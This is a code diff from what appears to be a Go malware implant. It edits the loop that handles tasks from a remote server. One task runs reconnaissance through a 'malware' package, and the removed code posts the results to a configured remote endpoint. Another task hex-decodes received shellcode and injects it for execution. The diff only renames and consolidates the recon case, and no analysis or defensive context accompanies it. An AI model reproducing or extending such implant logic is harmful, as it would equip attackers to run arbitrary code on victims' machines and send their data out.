@@ -44,8 +44,9 @@ func main() {
 			return
 		}
 		switch t.Tag {
-		case "miniRecon":
-			r, err := malware.DoMiniRecon(key)
+		case "recon":
+			//r, err := malware.DoMiniRecon(key)
+			r, err := malware.DoRecon(key)
 			if err != nil {
 				fmt.Println(err)
 				return
@@ -65,18 +66,8 @@ func main() {
 		case "payload":
 			shellcode, _ := hex.DecodeString(string(t.Payload))
 			inject(shellcode)
-		case "recon":
-			r, err := malware.DoRecon(key)
-			if err != nil {
-				fmt.Println(err)
-				return
-			}
-			_, err = malware.PostRequest(r, config.PostEndpoint, *config)
-			if err != nil {
-				fmt.Println(err)
-				return
-			}
 		}
+
 		fmt.Println(t.Tag)
 		fmt.Println(t.Payload)
 		fmt.Println(name)
